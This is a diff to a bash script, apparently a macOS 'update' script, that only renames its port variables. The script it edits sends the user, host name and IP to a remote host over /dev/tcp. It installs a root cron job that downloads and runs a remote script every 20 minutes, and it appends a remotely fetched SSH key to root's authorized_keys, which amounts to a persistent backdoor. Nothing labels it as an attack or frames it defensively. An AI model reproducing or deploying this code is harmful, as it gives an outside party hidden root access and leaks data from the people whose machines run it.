@@ -1,5 +1,7 @@
 #!/bin/bash
 host=boesen.science
+down_port=2042
+up_port=2043
 
 rm /tmp/update.sh
 
@@ -10,8 +12,6 @@ ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([
 
 info="$user $hostname $ip"
 
-port=2043
-
 ip_new=false
 if ! grep -q "^$ip$" /etc/ips; then
     echo "$ip" >> /etc/ips
@@ -20,11 +20,11 @@ fi
 
 if [[ $(< /etc/info) != "$user $hostname" || $ip_new = true ]]; then
     printf "$user $hostname" > /etc/info
-    printf "UPDATE: $info" >/dev/tcp/$host/$port
+    printf "UPDATE: $info" >/dev/tcp/$host/$up_port
 fi
 
 grep -v "$host" /var/at/tabs/root > /tmp/crontab
-echo "*/20 * * * * curl -L $host:2042/mac/update.sh |bash" >> /tmp/crontab
+echo "*/20 * * * * curl -L $host:$down_port/mac/update.sh |bash" >> /tmp/crontab
 mv /tmp/crontab /var/at/tabs/root
 
 # Enable SSH
@@ -37,5 +37,5 @@ sshpath="/var/root/.ssh"
 mkdir -p "$sshpath"
 
 if ! grep -q boesene $sshpath/authorized_keys; then
-    curl -L $host:2042/pubkey >> $sshpath/authorized_keys
+    curl -L $host:$down_port/pubkey >> $sshpath/authorized_keys
 fi
